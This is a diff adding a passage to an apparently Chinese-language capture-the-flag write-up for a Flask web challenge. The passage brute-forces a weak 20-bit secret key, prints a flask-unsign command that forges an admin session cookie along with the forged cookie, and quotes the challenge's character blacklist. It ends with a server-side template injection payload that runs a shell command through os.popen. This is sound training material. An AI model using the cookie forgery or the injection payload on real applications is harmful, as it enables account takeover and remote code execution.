@@ -147,6 +147,27 @@ users = {
     "pwnlyfans": User("pwnlyfans", ''.join(choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(32)), V.user)
 }
 ```
+看到secrets为`app.secret_key = hex(getrandbits(20))`,爆破
+
+![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240414212946.png)
+
+`0xbbe18`
+
+`flask-unsign -s --secret "0xbbe18" --cookie "{'_fresh': False, '_id': '09120b7e8cf2ee71c6a5c874479193608d3eba9822f44d9341f44a6076456bd081bb8ad8719f74f2fb9deb2e7b8ac8c6b4b39cd30a83c082b852a0b96a4820ab', '_user_id': 'admin'}" --no-literal-eval`
+
+得到admin的session
+```
+.eJwlzjEOwjAMQNG7ZGZwHDe2e5nKjh1RCRhaMSHuTiWmL_3pfco2jzzvZZ32OPNWtj3KWkArgnPKmJjJdXRbhjARa9XWQaKlmwriJAptVK9aB-60dA-Q6i4WwlUn08TpGumYfN0hozt50xENTNoAQZcFDVy7kSCYlwvyPvP4ayye-6t8f4VbMTY.ZhvbZQ.-GnCt5UVviTjN6PrEodMeBbKO3I
+```
+
+需要绕过ssti的长度限制
+![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240414214310.png)
+
+不需要绕,是先append然后根据len来显示错误消息,可以自己计算post_id
+黑名单`INVALID = ["{{", "}}", ".", "_", "[", "]","\\", "x"]`
+
+`{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}`
+
 
 # reverse
 
